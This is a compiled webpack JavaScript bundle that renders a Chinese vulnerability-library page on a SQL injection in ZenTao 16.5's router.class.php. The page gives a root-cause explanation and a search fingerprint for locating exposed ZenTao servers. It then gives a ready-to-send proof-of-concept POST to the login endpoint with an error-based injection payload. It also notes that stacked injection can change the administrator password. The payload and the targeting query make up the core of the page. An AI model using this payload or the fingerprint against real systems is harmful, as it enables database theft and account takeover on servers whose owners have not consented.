(window.webpackJsonp=window.webpackJsonp||[]).push([[59],{1224:function(s,a,t){s.exports=t.p+"assets/img/1651845742331-80eb4af4-3ecb-465a-b9f4-6b9f211bce3a.06ae8e17.png"},1225:function(s,a,t){s.exports=t.p+"assets/img/1651970702476-e791e909-c6ad-4386-a9ed-bd0f93454d92.5a3a4fc9.png"},1226:function(s,a,t){s.exports=t.p+"assets/img/1651971046505-0dfe20a0-ed9b-4704-a233-fbf1967c0248.6c57168e.png"},1227:function(s,a,t){s.exports=t.p+"assets/img/1651971584690-5654e6cd-48ca-4f5e-a552-7c6d6648f968.ef53fa28.png"},1228:function(s,a,t){s.exports=t.p+"assets/img/1651845951752-a3b596a1-d07e-4283-9373-64f5d4c95f87.6c84f133.png"},2537:function(s,a,t){"use strict";t.r(a);var r=t(75),e=Object(r.a)({},(function(){var s=this,a=s.$createElement,r=s._self._c||a;return r("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[r("h1",{attrs:{id:"禅道-16-5-router-class-php-sql注入漏洞"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#禅道-16-5-router-class-php-sql注入漏洞"}},[s._v("#")]),s._v(" 禅道 16.5 router.class.php SQL注入漏洞")]),s._v(" "),r("h2",{attrs:{id:"漏洞描述"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),r("p",[s._v("禅道 16.5 router.class.php 文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息，危害服务器安全")]),s._v(" "),r("h2",{attrs:{id:"漏洞影响"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v("禅道 16.5")]),r("br"),s._v(" "),r("h2",{attrs:{id:"网络测绘"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),r("a-checkbox",{attrs:{checked:""}},[s._v('app="易软天创-禅道系统"')]),r("br"),s._v(" "),r("h2",{attrs:{id:"漏洞复现"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),r("p",[s._v("登录页面")]),s._v(" "),r("p",[r("img",{attrs:{src:t(1224),alt:"img"}})]),s._v(" "),r("p",[r("code",[s._v("16.5 到 16.5.1 版本")]),s._v("更新了 "),r("code",[s._v("framework/base/router.class.php")]),s._v(" 文件")]),s._v(" "),r("p",[r("img",{attrs:{src:t(1225),alt:"img"}})]),s._v(" "),r("p",[r("code",[s._v("account参数")]),s._v("使用了"),r("code",[s._v("quote方法")]),s._v("进行过滤SQL语句")]),s._v(" "),r("p",[r("img",{attrs:{src:t(1226),alt:"img"}})]),s._v(" "),r("p",[s._v("可以看到这个方法主要是对字段加转义，所以可以推断 16.5 版本中存在SQL注入, 跟踪调试测试SQL注入")]),s._v(" "),r("p",[r("img",{attrs:{src:t(1227),alt:"img"}})]),s._v(" "),r("p",[s._v("验证POC如下, 其中同样存在堆叠注入，通过SQL语句可修改管理员密码等")]),s._v(" "),r("div",{staticClass:"language-java line-numbers-mode"},[r("pre",{pre:!0,attrs:{class:"language-java"}},[r("code",[s._v("POST "),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("user"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("login"),r("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("html\n\naccount"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("admin"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("27")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("and"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),s._v("select"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("extractvalue"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("281")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("Cconcat"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("280")]),s._v("x7e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("C"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),s._v("select"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("user"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("28")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("C0x7e"),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("29")]),r("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),r("span",{pre:!0,attrs:{class:"token number"}},[s._v("23")]),s._v("\n")])]),s._v(" "),r("div",{staticClass:"line-numbers-wrapper"},[r("span",{staticClass:"line-number"},[s._v("1")]),r("br"),r("span",{staticClass:"line-number"},[s._v("2")]),r("br"),r("span",{staticClass:"line-number"},[s._v("3")]),r("br")])]),r("p",[r("img",{attrs:{src:t(1228),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);